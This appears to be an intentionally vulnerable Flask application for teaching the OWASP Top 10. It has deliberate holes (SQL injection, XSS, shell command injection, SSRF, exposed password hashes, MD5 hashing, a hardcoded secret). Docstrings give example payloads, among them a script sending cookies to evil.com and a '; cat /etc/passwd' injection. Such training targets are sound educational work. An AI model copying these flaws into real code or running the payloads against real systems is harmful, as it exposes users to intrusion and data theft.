"""
vulnerable_app/app.py — Intentionally vulnerable Flask application.

PURPOSE:
    This file demonstrates OWASP Top 10 vulnerabilities in a controlled,
    educational environment. Every flaw is labelled with its OWASP category,
    a description of why it is dangerous, and what an attacker can do with it.

    DO NOT deploy this to production. It exists ONLY to:
    1. Show you what bad code looks like so you recognise it in real codebases
    2. Serve as a target for SAST tools (Bandit) so you can see what they catch
    3. Give you something to fix in secure_app/app.py

OWASP TOP 10 (2021) COVERED:
    A01 - Broken Access Control      (admin panel, IDOR)
    A02 - Cryptographic Failures     (plaintext passwords, HTTP, weak hashing)
    A03 - Injection                  (SQL injection, command injection)
    A04 - Insecure Design            (no rate limiting, no account lockout)
    A05 - Security Misconfiguration  (debug mode, verbose errors, default secrets)
    A06 - Vulnerable Components      (noted in requirements)
    A07 - Authentication Failures    (broken auth, session fixation)
    A08 - Software & Data Integrity  (no integrity checks)
    A09 - Security Logging Failures  (no logging of auth events)
    A10 - SSRF                       (server-side request forgery endpoint)
"""

import sqlite3
import os
import subprocess
import hashlib

from flask import (
    Flask, request, render_template_string,
    session, redirect, url_for, jsonify
)

# ===========================================================================
# FLAW: A05 - Security Misconfiguration
# debug=True exposes an interactive debugger to anyone who triggers an error.
# The debugger allows ARBITRARY PYTHON CODE EXECUTION via the browser.
# secret_key is hardcoded and trivially guessable — anyone who reads this file
# can forge session cookies.
# ===========================================================================
app = Flask(__name__)
app.secret_key = "supersecret123"          # FLAW: hardcoded, weak secret
app.config["DEBUG"] = True                 # FLAW: debug mode in "production"
DATABASE = "vulnerable.db"


# ---------------------------------------------------------------------------
# Database setup
# ---------------------------------------------------------------------------

def get_db():
    """
    FLAW: No connection pooling. Creates a new connection on every request.
    In production this exhausts database connections under load.
    """
    conn = sqlite3.connect(DATABASE)
    return conn


def init_db():
    conn = get_db()
    # ===========================================================================
    # FLAW: A02 - Cryptographic Failure
    # Passwords stored as MD5 hashes. MD5:
    #   - Has known collision attacks
    #   - Is NOT a password hashing algorithm (designed for speed, not security)
    #   - Entire rainbow tables exist for common passwords
    # A real password hash uses bcrypt/argon2 with a random salt.
    # ===========================================================================
    conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE,
            password TEXT,       -- FLAW: MD5 hash, not bcrypt
            role TEXT DEFAULT 'user',
            email TEXT
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS notes (
            id INTEGER PRIMARY KEY,
            user_id INTEGER,
            content TEXT,
            is_private INTEGER DEFAULT 1
        )
    """)
    # Seed admin user: password = "password" (MD5)
    admin_hash = hashlib.md5(b"password").hexdigest()     # FLAW: MD5 password
    conn.execute(
        "INSERT OR IGNORE INTO users (username, password, role) VALUES (?, ?, ?)",
        ("admin", admin_hash, "admin"),
    )
    conn.execute(
        "INSERT OR IGNORE INTO users (username, password, role) VALUES (?, ?, ?)",
        ("alice", hashlib.md5(b"alice123").hexdigest(), "user"),  # FLAW
    )
    conn.execute("INSERT OR IGNORE INTO notes (user_id, content) VALUES (1, 'Admin secret: flag{sql_injection_works}')")
    conn.execute("INSERT OR IGNORE INTO notes (user_id, content) VALUES (2, 'Alice private note')")
    conn.commit()
    conn.close()


# ---------------------------------------------------------------------------
# A03: SQL Injection
# ---------------------------------------------------------------------------

@app.route("/login", methods=["GET", "POST"])
def login():
    """
    FLAW: A03 - SQL Injection (Authentication Bypass)

    The username and password are concatenated directly into the SQL query.
    An attacker can log in as any user without knowing the password by entering:
        username: admin' --
        password: anything

    The -- comments out the password check:
        SELECT * FROM users WHERE username='admin' --' AND password='...'
        becomes:
        SELECT * FROM users WHERE username='admin'
    """
    error = None
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        # ===========================================================================
        # FLAW: A03 - SQL Injection
        # NEVER do this. User input is concatenated directly into SQL.
        # ===========================================================================
        hashed = hashlib.md5(password.encode()).hexdigest()
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{hashed}'"  # noqa: S608

        conn = get_db()
        user = conn.execute(query).fetchone()   # FLAW: raw string query
        conn.close()

        if user:
            session["user_id"]  = user[0]
            session["username"] = user[1]
            session["role"]     = user[3]
            return redirect(url_for("dashboard"))
        error = "Invalid credentials"

    # FLAW: A03 - Reflected XSS (also) — error message rendered without escaping
    return render_template_string("""
        <h2>Login</h2>
        <p style="color:red">{{ error }}</p>
        <form method="post">
            Username: <input name="username"><br>
            Password: <input name="password" type="password"><br>
            <input type="submit" value="Login">
        </form>
        <p><a href="/register">Register</a></p>
    """, error=error)


@app.route("/search")
def search():
    """
    FLAW: A03 - SQL Injection (Data Extraction)

    Query parameter 'q' goes straight into SQL.
    An attacker can extract any table:
        /search?q=' UNION SELECT username,password,3,4,5 FROM users --
    """
    q = request.args.get("q", "")

    # FLAW: Direct string interpolation into SQL
    query = f"SELECT * FROM notes WHERE content LIKE '%{q}%'"  # noqa: S608
    conn  = get_db()
    rows  = conn.execute(query).fetchall()
    conn.close()

    # FLAW: A03 - XSS — user input reflected directly into HTML without escaping
    return f"<h2>Search results for: {q}</h2><pre>{rows}</pre>"     # noqa


# ---------------------------------------------------------------------------
# A01: Broken Access Control + IDOR
# ---------------------------------------------------------------------------

@app.route("/dashboard")
def dashboard():
    if "user_id" not in session:
        return redirect(url_for("login"))
    return render_template_string("""
        <h2>Welcome {{ username }}!</h2>
        <a href="/admin">Admin Panel</a> |
        <a href="/notes/1">Note #1</a> |
        <a href="/profile?id={{ user_id }}">Profile</a> |
        <a href="/logout">Logout</a>
    """, username=session["username"], user_id=session["user_id"])


@app.route("/admin")
def admin():
    """
    FLAW: A01 - Broken Access Control

    The admin check is client-side: it reads from the session cookie.
    But there is no server-side enforcement on most routes.
    Worse: the role is stored directly in the session (which can be forged
    if the secret_key is known — and it's "supersecret123").
    """
    # FLAW: role check exists but secret_key is trivially known
    if session.get("role") != "admin":
        return "Access denied", 403

    conn  = get_db()
    users = conn.execute("SELECT id, username, role, email FROM users").fetchall()
    conn.close()
    return f"<h2>Admin Panel</h2><pre>{users}</pre>"


@app.route("/notes/<int:note_id>")
def get_note(note_id: int):
    """
    FLAW: A01 - Insecure Direct Object Reference (IDOR)

    Any authenticated user can read ANY note by changing the note_id in the URL.
    There is no check that the note belongs to the requesting user.
    /notes/1 → returns admin's secret note
    """
    if "user_id" not in session:
        return redirect(url_for("login"))

    conn = get_db()
    # FLAW: IDOR — no WHERE user_id = session['user_id']
    note = conn.execute("SELECT * FROM notes WHERE id = ?", (note_id,)).fetchone()
    conn.close()
    return f"<h2>Note #{note_id}</h2><p>{note}</p>" if note else ("Not found", 404)


@app.route("/profile")
def profile():
    """
    FLAW: A01 - Broken Access Control via parameter tampering.
    Any user can view any other user's profile by changing ?id=
    """
    user_id = request.args.get("id")
    conn    = get_db()
    # FLAW: No check that user_id matches session["user_id"]
    user    = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
    conn.close()
    return f"<h2>Profile</h2><pre>{user}</pre>"


# ---------------------------------------------------------------------------
# A03: XSS (Cross-Site Scripting)
# ---------------------------------------------------------------------------

@app.route("/comment", methods=["GET", "POST"])
def comment():
    """
    FLAW: A03 - Stored XSS

    User input is stored in the database and rendered without HTML escaping.
    An attacker submits: <script>document.location='https://evil.com?c='+document.cookie</script>
    Every user who views the comments page has their cookies stolen.
    """
    comments = []
    conn     = get_db()

    if request.method == "POST":
        content = request.form.get("comment", "")
        # FLAW: No sanitization before storage
        conn.execute("INSERT INTO notes (user_id, content) VALUES (1, ?)", (content,))
        conn.commit()

    rows     = conn.execute("SELECT content FROM notes").fetchall()
    conn.close()

    # FLAW: Stored XSS — Markup() bypasses Jinja2's auto-escaping
    comment_html = "".join(f"<p>{row[0]}</p>" for row in rows)

    return render_template_string(f"""
        <h2>Comments</h2>
        <form method="post">
            <textarea name="comment"></textarea>
            <input type="submit" value="Post">
        </form>
        {comment_html}
    """)   # FLAW: f-string bypasses Jinja2 autoescaping


# ---------------------------------------------------------------------------
# A03: Command Injection
# ---------------------------------------------------------------------------

@app.route("/ping")
def ping():
    """
    FLAW: A03 - OS Command Injection

    The 'host' parameter is passed directly to shell=True subprocess.
    Attacker enters: 192.168.1.1; cat /etc/passwd
    Result: the server runs both ping AND dumps /etc/passwd
    """
    host = request.args.get("host", "localhost")

    # ===========================================================================
    # FLAW: A03 - Command injection. NEVER use shell=True with user input.
    # ===========================================================================
    result = subprocess.run(             # noqa: S602
        f"ping -c 1 {host}",            # FLAW: user input in shell command
        shell=True,                      # FLAW: shell=True allows injection
        capture_output=True,
        text=True,
    )
    return f"<pre>{result.stdout}\n{result.stderr}</pre>"


# ---------------------------------------------------------------------------
# A10: Server-Side Request Forgery (SSRF)
# ---------------------------------------------------------------------------

@app.route("/fetch")
def fetch_url():
    """
    FLAW: A10 - Server-Side Request Forgery (SSRF)

    The server fetches a URL supplied by the user.
    An attacker can use this to:
    - Scan internal network: /fetch?url=http://192.168.1.1:8080
    - Access cloud metadata: /fetch?url=http://169.254.169.254/latest/meta-data/
    - Read local files: /fetch?url=file:///etc/passwd
    """
    import urllib.request
    url = request.args.get("url", "")
    # FLAW: No validation of URL, no blocklist of internal IPs
    try:
        with urllib.request.urlopen(url) as resp:     # noqa: S310
            return resp.read().decode()
    except Exception as e:
        return str(e)


# ---------------------------------------------------------------------------
# A07: Broken Authentication (no rate limiting, no lockout)
# ---------------------------------------------------------------------------

@app.route("/register", methods=["GET", "POST"])
def register():
    """
    FLAW: A04 - Insecure Design / A07 - Authentication Failures

    No rate limiting: an attacker can register thousands of accounts
    to enumerate the registration system or flood the database.
    No password complexity requirements.
    No email verification.
    """
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        # FLAW: MD5 password hashing (should be bcrypt/argon2)
        hashed = hashlib.md5(password.encode()).hexdigest()  # noqa: S324
        conn = get_db()
        try:
            conn.execute(
                "INSERT INTO users (username, password) VALUES (?, ?)",
                (username, hashed),
            )
            conn.commit()
        except sqlite3.IntegrityError:
            return "Username taken"
        conn.close()
        return redirect(url_for("login"))
    return render_template_string("""
        <h2>Register</h2>
        <form method="post">
            Username: <input name="username"><br>
            Password: <input name="password" type="password"><br>
            <input type="submit" value="Register">
        </form>
    """)


# ---------------------------------------------------------------------------
# A02: Sensitive Data Exposure
# ---------------------------------------------------------------------------

@app.route("/export")
def export():
    """
    FLAW: A02 - Cryptographic Failure / Sensitive Data Exposure

    Returns ALL user data including password hashes in plain JSON.
    No authentication required. Any visitor can call this endpoint.
    """
    # FLAW: No authentication check at all
    conn  = get_db()
    users = conn.execute("SELECT * FROM users").fetchall()
    conn.close()
    # FLAW: Password hashes exposed in API response
    return jsonify([
        {"id": u[0], "username": u[1], "password_hash": u[2], "role": u[3]}
        for u in users
    ])


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


# ---------------------------------------------------------------------------
# FLAW: A05 - verbose error handler
# ---------------------------------------------------------------------------

@app.errorhandler(500)
def internal_error(e):
    """
    FLAW: Returns full exception details to the client.
    Attackers use verbose errors to understand the server stack,
    database structure, and file paths.
    """
    return f"<h1>Internal Server Error</h1><pre>{e}</pre>", 500  # noqa


if __name__ == "__main__":
    init_db()
    # FLAW: debug=True, host="0.0.0.0" = exposed to network with debugger
    app.run(debug=True, host="0.0.0.0", port=5000)   # noqa: S201
